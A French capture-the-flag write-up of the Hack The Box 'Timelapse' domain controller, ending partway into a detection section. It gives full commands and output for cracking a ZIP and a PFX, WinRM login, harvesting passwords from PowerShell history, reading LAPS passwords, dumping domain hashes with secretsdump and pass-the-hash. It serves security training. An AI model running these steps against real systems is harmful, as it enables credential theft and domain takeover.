# 🎯 TIMELAPSE - HTB Write-Up 

## 📋 Résumé Exécutif

**Machine :** Timelapse (10.10.11.152)  
**OS :** Windows Server 2019  
**Domaine :** timelapse.htb / DC01.timelapse.htb  
**Difficulté :** Easy  
**Points Clés :** SMB Anonymous, PFX Certificate, WinRM Auth, PowerShell History, LAPS Abuse

### 🔗 Chaîne d'Attaque Complète

```
SMB Anonymous Access
    ↓ [Partage "Shares"]
winrm_backup.zip (password-protected)
    ↓ [zip2john + john → supremelegacy]
legacyy_dev_auth.pfx (encrypted)
    ↓ [pfx2john + john → thuglegacy]
Certificate SSL + Private Key
    ↓ [WinRM Certificate Auth]
legacyy (utilisateur domain)
    ↓ [PowerShell ConsoleHost_history.txt]
svc_deploy credentials (cleartext)
    ↓ [Membre de LAPS_Readers]
LAPS Password Administrator
    ↓ [impacket-secretsdump]
Hash NTLM de TRX
    ↓ [Pass-the-Hash]
TRX → Root Flag
```

---

## 1️⃣ RECONNAISSANCE

### 🔍 Scan Nmap

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.152

# Scan détaillé
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV 10.10.11.152 -oN nmap.txt
```

**Résultats :**

| Port | Service | Version | Rôle |
|------|---------|---------|------|
| 53 | DNS | Simple DNS Plus | Résolution de noms |
| 88 | Kerberos | Microsoft Windows Kerberos | Authentification AD |
| 135 | MSRPC | Microsoft Windows RPC | Communication RPC |
| 139 | NetBIOS-SSN | Microsoft Windows NetBIOS | Partage fichiers (legacy) |
| 389 | LDAP | Microsoft AD LDAP | Annuaire Active Directory |
| 445 | SMB | Microsoft-DS (Windows Server 2019) | Partage fichiers moderne |
| 464 | kpasswd5 | - | Changement mot de passe Kerberos |
| 593 | HTTP-RPC | Microsoft Windows RPC over HTTP | RPC via HTTP |
| 636 | LDAPS | - | LDAP sécurisé (SSL/TLS) |
| 3268 | Global Catalog | Microsoft AD LDAP | Catalogue global AD |
| 3269 | GC-SSL | - | Catalogue global sécurisé |
| 5986 | WinRM-HTTPS | Microsoft HTTPAPI 2.0 | PowerShell Remoting (SSL) |
| 9389 | ADWS | .NET Message Framing | AD Web Services |

**Identification :**
- **Domaine :** timelapse.htb
- **Hostname :** DC01.timelapse.htb
- **Rôle :** Domain Controller Windows Server 2019
- **WinRM :** Port 5986 (HTTPS uniquement, pas de port 5985)
- **Certificat SSL :** CN=DC01.timelapse.htb

**⏰ Décalage Horaire :** +59min 53s

> **⚠️ Note Importante :** Le décalage horaire peut causer des échecs d'authentification Kerberos (erreur KRB_AP_ERR_SKEW). Synchronisation recommandée :
> ```bash
> sudo ntpdate -s 10.10.11.152
> ```

### 📝 Configuration /etc/hosts

```bash
echo "10.10.11.152 dc01.timelapse.htb timelapse.htb" | sudo tee -a /etc/hosts
```

---

## 2️⃣ ÉNUMÉRATION SMB

### 🎓 Qu'est-ce que SMB ?

**SMB (Server Message Block)** est le protocole de partage de fichiers et imprimantes de Microsoft.

**Versions :**
- SMBv1 : Obsolète, vulnérable (EternalBlue, etc.)
- SMBv2/3 : Moderne, chiffrement supporté

**Vecteurs d'attaque courants :**
- ✅ Accès anonyme (null session)
- ✅ Énumération des utilisateurs
- ✅ Partages mal sécurisés
- ✅ Fichiers sensibles accessibles

### 🔎 Énumération des Partages

```bash
# Liste des partages avec accès anonyme
smbclient -L //10.10.11.152 -N

# Alternative avec netexec
netexec smb 10.10.11.152 --shares -u '' -p ''
```

**Résultat :**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shares          Disk      ⭐ Partage personnalisé !
SYSVOL          Disk      Logon server share
```

**Analyse :**

| Partage | Accès Anonyme | Description |
|---------|---------------|-------------|
| ADMIN$ | ❌ | Partage administratif (C:\Windows) |
| C$ | ❌ | Racine du disque C:\ |
| IPC$ | ✅ (lecture) | Inter-Process Communication |
| NETLOGON | ❌ | Scripts de connexion domaine |
| **Shares** | **✅ (lecture/écriture)** | **Partage personnalisé suspect** |
| SYSVOL | ❌ | Stratégies de groupe (GPO) |

### 📁 Exploration du Partage "Shares"

```bash
smbclient //10.10.11.152/Shares -N
```

**Navigation :**

```
smb: \> ls
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

smb: \> cd Dev
smb: \Dev\> ls
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

smb: \Dev\> get winrm_backup.zip
```

**💡 Découverte Critique :** Fichier `winrm_backup.zip` dans le dossier Dev !

**Indices :**
- Nom du fichier → Backup WinRM (credentials/certificats probable)
- Dossier "Dev" → Environnement de développement (souvent moins sécurisé)
- Accès anonyme → Mauvaise configuration de sécurité

---

## 3️⃣ CRACKING - ZIP ET PFX

### 🔓 Étape 1 : Cracking du ZIP

**🎯 Objectif :** Le fichier ZIP est protégé par mot de passe.

**Vérification :**
```bash
unzip winrm_backup.zip
# Archive:  winrm_backup.zip
# [winrm_backup.zip] legacyy_dev_auth.pfx password:
```

**Conversion pour John :**

```bash
zip2john winrm_backup.zip > zip.john
```

**Contenu du hash :**
```
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip2$1*1*2*0*a33*9fb*...
```

**Cracking :**

```bash
john zip.john --wordlist=/usr/share/wordlists/rockyou.txt
```

**Résultat (3 secondes) :**

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:03 DONE (2025-12-13 14:15) 0.2777g/s 9631Kp/s 9631Kc/s 9631KC/s
```

**🔑 Mot de passe ZIP :** `supremelegacy`

**Extraction :**

```bash
unzip winrm_backup.zip
# Archive:  winrm_backup.zip
# [winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
# extracting: legacyy_dev_auth.pfx
```

### 📜 Étape 2 : Analyse du Fichier PFX

**🎓 Qu'est-ce qu'un fichier PFX/P12 ?**

**PFX (Personal Information Exchange)** = **PKCS#12** est un format de conteneur cryptographique qui stocke :

1. **Certificat X.509** (partie publique)
   - Identifie le propriétaire
   - Contient la clé publique
   - Signé par une CA (Certificate Authority)

2. **Clé privée RSA/ECC** (partie privée)
   - Permet le déchiffrement
   - Permet la signature numérique
   - **DOIT rester secrète !**

3. **Chaîne de certificats** (optionnel)
   - Certificats intermédiaires
   - Certificat racine (Root CA)

**Usages courants :**

| Contexte | Usage |
|----------|-------|
| **WinRM/PowerShell** | Authentification par certificat |
| **IIS/Web Servers** | Certificats SSL/TLS (HTTPS) |
| **VPN** | Authentification client |
| **Code Signing** | Signature d'applications |
| **S/MIME** | Chiffrement d'emails |

**Inspection du PFX :**

```bash
# Lister le contenu sans extraire
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -info
# Enter Import Password: [demande le mot de passe]
```

**❌ Problème :** Le PFX lui-même est protégé par un mot de passe !

### 🔓 Étape 3 : Cracking du PFX

**Conversion pour John :**

```bash
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
```

**⚠️ Erreur Potentielle :**

```python
Traceback (most recent call last):
  File "/usr/share/john/pfx2john.py", line 5, in <module>
    from asn1crypto import cms
ModuleNotFoundError: No module named 'asn1crypto'
```

**Solution :**

```bash
# Installation du package système
sudo apt install python3-asn1crypto -y

# Vérification
python3 -c "import asn1crypto; print('OK')"
# OK

# Réessayer
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
```

**Cracking :**

```bash
john pfx.john --wordlist=/usr/share/wordlists/rockyou.txt
```

**Résultat (5 secondes) :**

```
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE SHA1/SHA2 AES/3DES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:05 DONE (2025-12-13 14:18) 0.1960g/s 632889p/s 632889c/s 632889C/s
```

**🔑 Mot de passe PFX :** `thuglegacy`

### 🔐 Étape 4 : Extraction Certificat et Clé Privée

**Extraction de la clé privée :**

```bash
openssl pkcs12 \
  -in legacyy_dev_auth.pfx \
  -nocerts \
  -out key.pem \
  -nodes
# Enter Import Password: thuglegacy
```

**Flags expliqués :**

| Flag | Signification |
|------|---------------|
| `-in` | Fichier PFX source |
| `-nocerts` | Exporter **uniquement** la clé privée (pas les certificats) |
| `-out` | Fichier de sortie |
| `-nodes` | **No DES** - Ne pas chiffrer la clé exportée (stockage en clair) |

**⚠️ Sécurité :** Le flag `-nodes` produit une clé privée **non chiffrée**. En production, utiliser `-des3` ou `-aes256` pour chiffrer la clé exportée.

**Extraction du certificat :**

```bash
openssl pkcs12 \
  -in legacyy_dev_auth.pfx \
  -nokeys \
  -out cert.pem
# Enter Import Password: thuglegacy
```

**Flags expliqués :**

| Flag | Signification |
|------|---------------|
| `-nokeys` | Exporter **uniquement** le certificat (pas la clé privée) |

**Vérification des fichiers générés :**

```bash
ls -lh *.pem
# -rw------- 1 kali kali 1.9K Dec 13 14:20 cert.pem
# -rw------- 1 kali kali 1.7K Dec 13 14:19 key.pem

# Inspecter le certificat
openssl x509 -in cert.pem -text -noout
```

**Informations du certificat :**

```
Subject: CN=Legacyy
Issuer: CN=timelapse-DC01-CA
Validity:
    Not Before: Oct 25 14:05:37 2021 GMT
    Not After : Oct 25 14:25:37 2031 GMT  ⬅️ Valide 10 ans !
Subject Alternative Name: 
    othername: UPN::legacyy@timelapse.htb  ⬅️ Username AD !
```

**💡 Découvertes Importantes :**

1. **Nom d'utilisateur :** legacyy@timelapse.htb
2. **CA :** timelapse-DC01-CA (CA interne du domaine)
3. **UPN (User Principal Name) :** legacyy@timelapse.htb
4. **Usage :** Client Authentication (EKU 1.3.6.1.5.5.7.3.2)

---

## 4️⃣ ACCÈS INITIAL - WINRM CERTIFICATE AUTH

### 🎓 Qu'est-ce que WinRM ?

**Windows Remote Management (WinRM)** est l'implémentation Microsoft du protocole **WS-Management** (Web Services for Management).

**Fonctionnalités :**
- Exécution de commandes PowerShell à distance
- Administration de serveurs Windows sans RDP
- Automatisation de tâches (scripts, déploiements)
- Collecte d'informations système

**Ports par défaut :**

| Port | Protocole | Chiffrement |
|------|-----------|-------------|
| 5985 | HTTP | ❌ Clair (non recommandé en production) |
| 5986 | HTTPS | ✅ TLS/SSL |

**Prérequis d'accès :**
- Membre du groupe **Remote Management Users**
- OU administrateur local/domaine
- Pare-feu autorisant le port 5985/5986

### 🔐 Méthodes d'Authentification WinRM

| Méthode | Description | Sécurité |
|---------|-------------|----------|
| **Basic** | Username + Password (Base64) | ⚠️ Faible (clear text) |
| **Kerberos** | Ticket-based (AD) | ✅ Fort |
| **Negotiate** | Kerberos si disponible, sinon NTLM | ✅ Bon |
| **CredSSP** | Delegation de credentials | ⚠️ Risque de vol |
| **Certificate** | Certificat X.509 + Clé privée | ✅ Très fort |

**Notre cas :** Authentification par **certificat client** (Client Certificate Authentication)

### 🚪 Connexion WinRM avec Evil-WinRM

**Evil-WinRM** est un outil offensif pour exploitation WinRM :
- Support certificats
- Upload/Download de fichiers
- Load de modules PowerShell
- Bypass AMSI/AppLocker
- Menu interactif

**Installation :**

```bash
# Via gem (Ruby)
sudo gem install evil-winrm

# Vérification
evil-winrm --version
# Evil-WinRM shell v3.5
```

**Commande de connexion :**

```bash
evil-winrm \
  -i 10.10.11.152 \
  -c cert.pem \
  -k key.pem \
  -S
```

**Flags expliqués :**

| Flag | Signification |
|------|---------------|
| `-i` | IP/hostname cible |
| `-c` | Certificat (public key) |
| `-k` | Clé privée (private key) |
| `-S` | **SSL activé** (port 5986 au lieu de 5985) |

**✅ Connexion Réussie !**

```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled

Data: For more information, check Evil-WinRM GitHub

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

*Evil-WinRM* PS C:\Users\legacyy\Documents> hostname
DC01
```

### 🏁 User Flag

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..\Desktop

*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   6:57 PM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
3a84f0e5************************  ⭐ USER FLAG
```

---

## 5️⃣ ÉLÉVATION - SVC_DEPLOY

### 🔍 Énumération Post-Exploitation

**Informations utilisateur :**

```powershell
*Evil-WinRM* PS> whoami /all

USER INFORMATION
----------------
User Name         SID
================= =============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603

GROUP INFORMATION
-----------------
Group Name                                  Type             SID
=========================================== ================ =============
Everyone                                    Well-known group S-1-1-0
BUILTIN\Remote Management Users             Alias            S-1-5-32-580  ⬅️ WinRM access
BUILTIN\Users                               Alias            S-1-5-32-545
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11
...

*Evil-WinRM* PS> net user legacyy /domain
The request will be processed at a domain controller for domain timelapse.htb.

User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
```

**💡 Découvertes :**
- Membre de `Remote Management Users` (accès WinRM confirmé)
- Membre du groupe `Development` (permissions potentiellement élevées)
- Compte utilisateur standard (pas admin)

### 🎯 PowerShell History - Goldmine de Credentials

**🎓 Concept Important :**

PowerShell stocke un historique des commandes dans un fichier texte via le module **PSReadLine**. Ce fichier contient **TOUT** ce qui a été tapé, y compris :

- ✅ Mots de passe en clair
- ✅ Credentials dans des scripts
- ✅ Commandes administratives sensibles
- ✅ Tokens/API keys
- ✅ Chemins réseau

**Chemin du fichier :**

```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Équivalent :**

```
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Lecture de l'historique :**

```powershell
*Evil-WinRM* PS> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

**🔑 JACKPOT ! Credentials Trouvés :**

```
Username: svc_deploy
Password: E3R$Q62^12p7PLlC%KWaxuaV
```

### 🎓 Analyse Technique du Script PowerShell

**Ligne par ligne :**

```powershell
# 1. Créer des options de session (ignorer validation SSL)
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck

# Flags expliqués :
#   -SkipCACheck          : Ne pas vérifier si le certificat est signé par une CA de confiance
#   -SkipCNCheck          : Ne pas vérifier si le CN du certificat correspond au hostname
#   -SkipRevocationCheck  : Ne pas vérifier si le certificat est révoqué (CRL)

# 2. Convertir le mot de passe en SecureString
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force

# -AsPlainText : Le mot de passe est fourni en clair (pas chiffré)
# -Force       : Ignorer l'avertissement de sécurité

# 3. Créer un objet PSCredential
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

# PSCredential = Username + SecureString password (format requis par PowerShell)

# 4. Exécuter une commande à distance via WinRM
invoke-command \
  -computername localhost \           # Cible : machine locale (DC01)
  -credential $c \                    # Utiliser les credentials de svc_deploy
  -port 5986 \                        # WinRM HTTPS
  -usessl \                           # Forcer SSL/TLS
  -SessionOption $so \                # Options créées à l'étape 1
  -scriptblock {whoami}               # Commande à exécuter : whoami
```

**💡 Pourquoi ce script existe ?**

Scénario probable :
1. Administrateur a besoin de tester WinRM avec `svc_deploy`
2. Certificat SSL auto-signé → nécessite de skip les vérifications
3. Met le mot de passe **en clair** dans le script (mauvaise pratique !)
4. Oublie de nettoyer l'historique PowerShell

### 🔄 Connexion en tant que svc_deploy

**Déconnexion :**

```powershell
*Evil-WinRM* PS> exit
```

**Nouvelle connexion :**

```bash
evil-winrm \
  -i 10.10.11.152 \
  -u svc_deploy \
  -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
  -S
```

**✅ Connexion Réussie !**

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------
Group Name                                  Type             SID
=========================================== ================ =============
...
BUILTIN\Remote Management Users             Alias            S-1-5-32-580
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-...-2103  ⭐
...
```

**🎉 Découverte Majeure :** `svc_deploy` est membre du groupe **LAPS_Readers** !

---

## 6️⃣ EXPLOITATION LAPS

### 🎓 Qu'est-ce que LAPS ?

**LAPS (Local Administrator Password Solution)** est une solution Microsoft gratuite qui :

**Problème résolu :**
- Évite l'utilisation du **même mot de passe** pour le compte Administrateur local sur toutes les machines
- Empêche les attaques **Pass-the-Hash** latérales

**Fonctionnement :**

1. **Extension du schéma AD :**
   - Ajoute 2 attributs aux objets Computer :
     - `ms-Mcs-AdmPwd` : Mot de passe en clair (!)
     - `ms-Mcs-AdmPwdExpirationTime` : Date d'expiration

2. **Agent LAPS sur chaque machine :**
   - Génère un mot de passe aléatoire (12-14 caractères par défaut)
   - Applique le mot de passe au compte Administrateur local
   - Écrit le mot de passe dans AD (attribut `ms-Mcs-AdmPwd`)
   - Rotation automatique (ex: tous les 30 jours)

3. **ACLs sur l'attribut AD :**
   - Seuls les membres de `LAPS_Readers` (ou équivalent) peuvent lire `ms-Mcs-AdmPwd`
   - Les ordinateurs peuvent écrire leur propre mot de passe (SELF)

**Architecture :**

```
┌──────────────┐
│  Computer    │ 
│  DC01        │───┐
│              │   │ Write password
│  LAPS Agent  │   │ (every 30 days)
└──────────────┘   │
                   ▼
              ┌─────────────────────────────┐
              │  Active Directory           │
              │  ┌───────────────────────┐  │
              │  │ Computer Object: DC01 │  │
              │  │                       │  │
              │  │ ms-Mcs-AdmPwd:        │  │
              │  │   "P@ssw0rd123!xyz"   │◄─┼─── Read by
              │  │                       │  │    LAPS_Readers
              │  │ ms-Mcs-AdmPwdExp:     │  │
              │  │   2025-01-15          │  │
              │  └───────────────────────┘  │
              └─────────────────────────────┘
```

**Avantages Sécurité :**
- ✅ Mots de passe uniques par machine
- ✅ Rotation automatique
- ✅ Audit centralisé (qui lit les mots de passe)
- ✅ Pas de stockage local du mot de passe

**Vulnérabilité :**
- ❌ Mot de passe stocké **en clair** dans AD (pas de hash !)
- ❌ Si compromission d'un compte LAPS_Readers → accès admin local sur toutes les machines

### 🔍 Énumération LAPS

**Vérification des groupes de svc_deploy :**

```powershell
*Evil-WinRM* PS> net user svc_deploy /domain

User name                    svc_deploy
Full Name                    svc_deploy
Comment
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users  ⭐
```

**Énumération des ordinateurs du domaine :**

```powershell
*Evil-WinRM* PS> Get-ADComputer -Filter * | Select-Object Name

Name
----
DC01  ⬅️ Le contrôleur de domaine
```

**Alternative :**

```powershell
*Evil-WinRM* PS> $env:LOGONSERVER
\\DC01

*Evil-WinRM* PS> $env:USERDNSDOMAIN
timelapse.htb
```

### 🔑 Récupération du LAPS Password

**Commande PowerShell :**

```powershell
*Evil-WinRM* PS> Get-ADComputer -Identity "DC01" -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd

name  ms-Mcs-AdmPwd
----  -------------
DC01  I)}73pmp{9+;E2/kWv0LZ7Tt  ⭐
```

**Alternative (méthode LDAP directe) :**

```powershell
*Evil-WinRM* PS> Get-ADObject -Filter {objectClass -eq "computer"} -Properties ms-Mcs-AdmPwd

DistinguishedName  : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd      : I)}73pmp{9+;E2/kWv0LZ7Tt
Name               : DC01
ObjectClass        : computer
```

**🎉 Credentials Administrator Local Obtenus :**

```
Username: Administrator
Password: I)}73pmp{9+;E2/kWv0LZ7Tt
```

**💡 Note :** Ce mot de passe est pour le compte **Administrateur LOCAL** de DC01, pas nécessairement le compte Domain Admin.

---

## 7️⃣ ACCÈS ROOT

### 🚪 Connexion en tant qu'Administrator

```bash
evil-winrm \
  -i 10.10.11.152 \
  -u Administrator \
  -p 'I)}73pmp{9+;E2/kWv0LZ7Tt' \
  -S
```

**✅ Connexion Réussie !**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /groups | Select-String "Admin"

BUILTIN\Administrators                      Alias    S-1-5-32-544  ⬅️ Admin local
...
```

### 🔍 Recherche du Root Flag

**Tentative 1 : Dossier classique**

```powershell
*Evil-WinRM* PS> cd C:\Users\Administrator\Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
# Vide !
```

**Tentative 2 : Recherche globale**

```powershell
*Evil-WinRM* PS> Get-ChildItem -Path C:\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Where-Object {$_.Name -eq "root.txt"}

Directory: C:\Users\TRX\Desktop  ⬅️ Utilisateur TRX !

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   6:57 PM             34 root.txt
```

**🤔 Découverte Surprenante :** Le root flag est dans le profil de **TRX**, pas d'Administrator !

### ❌ Problème d'Accès

**Tentative de lecture directe :**

```powershell
*Evil-WinRM* PS> type C:\Users\TRX\Desktop\root.txt
type : Access to the path 'C:\Users\TRX\Desktop' is denied.
At line:1 char:1
+ type C:\Users\TRX\Desktop\root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\TRX\Desktop:String)
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

**Analyse des ACLs :**

```powershell
*Evil-WinRM* PS> Get-Acl C:\Users\TRX\Desktop | Format-List

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\TRX\Desktop
Owner  : TIMELAPSE\TRX  ⬅️ Propriétaire : TRX
Access : TIMELAPSE\TRX Allow  FullControl  ⬅️ Seul TRX a accès !
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  ReadAndExecute, Synchronize  ⬅️ Admins en lecture seulement !
```

**🎓 Explication :**

Même en tant qu'**Administrator du domaine**, les **ACLs NTFS** (permissions fichiers) peuvent restreindre l'accès.

**Options :**
1. ✅ Modifier les ACLs (mais risque de détection)
2. ✅ Se connecter en tant que TRX (Pass-the-Hash)
3. ❌ Forcer l'accès (peut corrompre le système)

**Décision :** Utiliser **secretsdump** pour obtenir le hash de TRX, puis **Pass-the-Hash**.

---

## 8️⃣ POST-EXPLOITATION - SECRETSDUMP

### 🎓 Qu'est-ce que secretsdump ?

**impacket-secretsdump** est un outil Python qui extrait les **secrets** d'un système Windows :

**Secrets extraits :**

| Type | Description | Usage Offensif |
|------|-------------|----------------|
| **SAM** | Hashes locaux (users locaux) | Pass-the-Hash local |
| **LSA Secrets** | Credentials stockés (services, tâches planifiées) | Mouvement latéral |
| **NTDS.dit** | Base de données AD (tous les users du domaine) | Pass-the-Hash, Golden Ticket |
| **Cached Credentials** | Hashes domain users (offline logon) | Cracking offline |
| **DPAPI MasterKeys** | Clés de déchiffrement DPAPI | Déchiffrer credentials stockés |

**Méthodes d'extraction :**

1. **Via réseau (RPC/SMB)** ← Méthode utilisée ici
   - Nécessite credentials admin
   - Pas besoin d'exécution de code

2. **Local (fichiers SYSTEM/SAM/NTDS.dit)**
   - Nécessite accès aux fichiers système
   - Volume Shadow Copy souvent utilisé

### 💾 Dump des Secrets

**Commande :**

```bash
impacket-secretsdump \
  Administrator:'I)}73pmp{9+;E2/kWv0LZ7Tt'@10.10.11.152
```

**Résultat (extrait) :**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0c0e91e0c81bad9d5dac0c4cc5c5b4a3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping Domain Credentials (NTDS.dit)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37:::
timelapse.htb\legacyy:1603:aad3b435b51404eeaad3b435b51404ee:93da975bcea111839cc584f2f528d63e:::
timelapse.htb\payl0ad:2601:aad3b435b51404eeaad3b435b51404ee:51bcc0dd5ad8d7d06e6e1438e99a83f8:::
timelapse.htb\svc_deploy:3103:aad3b435b51404eeaad3b435b51404ee:c912f3533b7114980dd7b6094be1a9d8:::
timelapse.htb\TRX:5101:aad3b435b51404eeaad3b435b51404ee:4c7121d35cd421cbbd3e44ce83bc923e:::  ⭐
...

[*] Kerberos keys grabbed
timelapse.htb\Administrator:aes256-cts-hmac-sha1-96:184a90b3...
timelapse.htb\Administrator:aes128-cts-hmac-sha1-96:7b984a6...
timelapse.htb\Administrator:des-cbc-md5:6e035f9...
...

[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

### 📊 Tableau Récapitulatif des Hashes

| Utilisateur | RID | Hash LM | Hash NTLM | Rôle |
|-------------|-----|---------|-----------|------|
| **Administrator** | 500 | aad3b435b51404eeaad3b435b51404ee | 22d04d77cc32a59f9fe6701aa9ffafb0 | Domain Admin |
| Guest | 501 | aad3b435b51404eeaad3b435b51404ee | 31d6cfe0d16ae931b73c59d7e0c089c0 | Compte désactivé |
| **krbtgt** | 502 | aad3b435b51404eeaad3b435b51404ee | 2960d580f05cd511b3da3d3663f3cb37 | Service account Kerberos |
| legacyy | 1603 | aad3b435b51404eeaad3b435b51404ee | 93da975bcea111839cc584f2f528d63e | User |
| payl0ad | 2601 | aad3b435b51404eeaad3b435b51404ee | 51bcc0dd5ad8d7d06e6e1438e99a83f8 | User |
| svc_deploy | 3103 | aad3b435b51404eeaad3b435b51404ee | c912f3533b7114980dd7b6094be1a9d8 | User (LAPS_Readers) |
| **TRX** | 5101 | aad3b435b51404eeaad3b435b51404ee | **4c7121d35cd421cbbd3e44ce83bc923e** | **User (root flag)** |

**🎓 Note sur Hash LM :**
```
aad3b435b51404eeaad3b435b51404ee
```
Ce hash constant signifie que **LM hashing est désactivé** (bonne pratique de sécurité).

### 🎯 Pass-the-Hash avec TRX

**🎓 Technique Pass-the-Hash :**

Au lieu d'utiliser un mot de passe en clair, on peut s'authentifier directement avec le **hash NTLM**. Cette technique fonctionne car :

1. Windows utilise NTLM pour l'authentification réseau
2. Le hash NTLM est la "clé" utilisée pour chiffrer les challenges NTLM
3. Pas besoin de connaître le mot de passe original !

**Avantages :**
- ✅ Pas de cracking nécessaire
- ✅ Fonctionne même avec mots de passe complexes
- ✅ Discret (pas de modification de mot de passe)

**Limitation :**
- ❌ Ne fonctionne pas avec Kerberos (nécessite le mot de passe ou un ticket)
- ❌ Détectable (event ID 4624 avec Logon Type 3)

**Connexion avec Evil-WinRM :**

```bash
evil-winrm \
  -i 10.10.11.152 \
  -u TRX \
  -H 4c7121d35cd421cbbd3e44ce83bc923e \
  -S
```

**Flags :**

| Flag | Signification |
|------|---------------|
| `-u` | Username |
| `-H` | **Hash NTLM** (au lieu de `-p` pour password) |
| `-S` | SSL activé |

**✅ Connexion Réussie !**

```
*Evil-WinRM* PS C:\Users\TRX\Documents> whoami
timelapse\trx

*Evil-WinRM* PS C:\Users\TRX\Documents> whoami /groups | Select-String "Admin"
# Pas d'admin → Utilisateur standard
```

### 🏁 Root Flag

```powershell
*Evil-WinRM* PS C:\Users\TRX\Documents> cd ..\Desktop

*Evil-WinRM* PS C:\Users\TRX\Desktop> dir
    Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   6:57 PM             34 root.txt

*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
6506078077b79f2969f0a0a69fe4eddf  ⭐ ROOT FLAG
```

---

## 9️⃣ DÉTECTION & MITIGATION

### 🛡️ Détection SMB Anonymous Access

**Event IDs Windows :**

```powershell
# Event ID 4624 - Logon réussi avec Anonymous Logon
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[5].Value -eq "3" -and  # Logon Type = Network
    $_.Properties[8].Value -match "ANONYMOUS"
}

